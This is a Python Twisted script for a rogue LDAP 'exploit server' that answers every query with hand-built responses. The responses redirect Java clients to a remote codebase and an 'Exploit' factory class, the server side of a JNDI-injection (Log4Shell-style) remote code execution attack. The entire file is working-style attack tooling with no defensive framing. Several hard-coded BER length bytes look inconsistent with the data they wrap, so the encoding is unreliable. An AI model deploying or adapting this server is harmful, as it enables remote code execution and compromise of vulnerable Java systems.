#!/usr/bin/env python3

from twisted.internet import reactor
from twisted.internet.protocol import ServerFactory, Protocol
from twisted.python import log
import sys

class LDAPExploitServer(Protocol):
    def connectionMade(self):
        print(f"[+] Connection from {self.transport.getPeer()}")
        
    def dataReceived(self, data):
        print(f"[+] Received LDAP query: {data.hex()}")
        
        # Basic LDAP response pointing to our HTTP server for Java class
        ldap_response = bytearray([
            0x30, 0x2e,  # SEQUENCE
            0x02, 0x01, 0x01,  # Message ID
            0x64, 0x29,  # Search Result Entry
            0x04, 0x00,  # Object Name (empty)
            0x30, 0x25,  # Attributes
            0x30, 0x23,  # Attribute
            0x04, 0x0b, 0x6a, 0x61, 0x76, 0x61, 0x43, 0x6f, 0x64, 0x65, 0x42, 0x61, 0x73, 0x65,  # "javaCodeBase"
            0x31, 0x12,  # Attribute values
            0x04, 0x10,  # String length
        ])
        
        # Add the URL to our exploit server
        url = b"http://ldap-server:8888/"
        ldap_response.extend([len(url)])
        ldap_response.extend(url)
        
        # Send reference result pointing to malicious class
        reference_response = bytearray([
            0x30, 0x34,  # SEQUENCE
            0x02, 0x01, 0x02,  # Message ID
            0x73, 0x2f,  # Search Result Reference
            0x04, 0x2d,  # URL length
        ])
        
        ref_url = b"ldap://ldap-server:1389/cn=Exploit,dc=attacker,dc=com"
        reference_response.extend(ref_url)
        
        # Java factory response
        factory_response = bytearray([
            0x30, 0x3c,  # SEQUENCE
            0x02, 0x01, 0x03,  # Message ID
            0x64, 0x37,  # Search Result Entry
            0x04, 0x1e,  # DN length
        ])
        
        dn = b"cn=Exploit,dc=attacker,dc=com"
        factory_response.extend(dn)
        factory_response.extend([
            0x30, 0x15,  # Attributes
            0x30, 0x13,  # Attribute
            0x04, 0x0b, 0x6a, 0x61, 0x76, 0x61, 0x46, 0x61, 0x63, 0x74, 0x6f, 0x72, 0x79,  # "javaFactory"
            0x31, 0x04,  # Values
            0x04, 0x02,  # String
        ])
        factory_response.extend(b"Exploit")
        
        # Send all responses
        self.transport.write(bytes(ldap_response))
        self.transport.write(bytes(reference_response))
        self.transport.write(bytes(factory_response))
        
        print("[+] Sent LDAP redirect to malicious Java class")

class LDAPExploitFactory(ServerFactory):
    protocol = LDAPExploitServer

if __name__ == "__main__":
    log.startLogging(sys.stdout)
    print("[*] Starting LDAP Exploit Server on port 1389")
    reactor.listenTCP(1389, LDAPExploitFactory())
    reactor.run()